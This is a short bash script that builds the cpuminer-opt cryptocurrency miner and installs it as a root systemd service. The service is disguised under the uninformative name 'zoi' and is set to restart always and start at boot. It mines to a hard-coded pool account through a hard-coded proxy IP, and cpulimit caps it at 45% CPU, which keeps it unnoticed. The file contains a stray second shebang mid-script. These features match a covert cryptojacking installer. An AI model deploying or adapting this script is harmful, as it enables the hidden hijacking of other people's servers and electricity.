#!/bin/bash
sudo apt-get update 
sudo apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git 
sudo sysctl vm.nr_hugepages=128 
cd /usr/local/src/
sudo git clone https://github.com/JayDDee/cpuminer-opt
cd cpuminer-opt
./autogen.sh &&
CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl
make
bash -c 'cat <<EOT >>/lib/systemd/system/zoi.service 
[Unit]
Description=zoi
After=network.target
[Service]
ExecStart= /usr/local/src/cpuminer-opt/cpuminer -a lyra2z330 -o stratum+tcp://hxx-pool2.chainsilo.com:3032 -u manlytq.tiger -p x -x 45.63.57.158:1102
WatchdogSec=2409
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
sudo apt-get install cpulimit -y &&
cpulimit --exe cpuminer --limit 45 -b &&
#!/bin/bash
systemctl daemon-reload &&
systemctl enable zoi.service &&
service zoi start
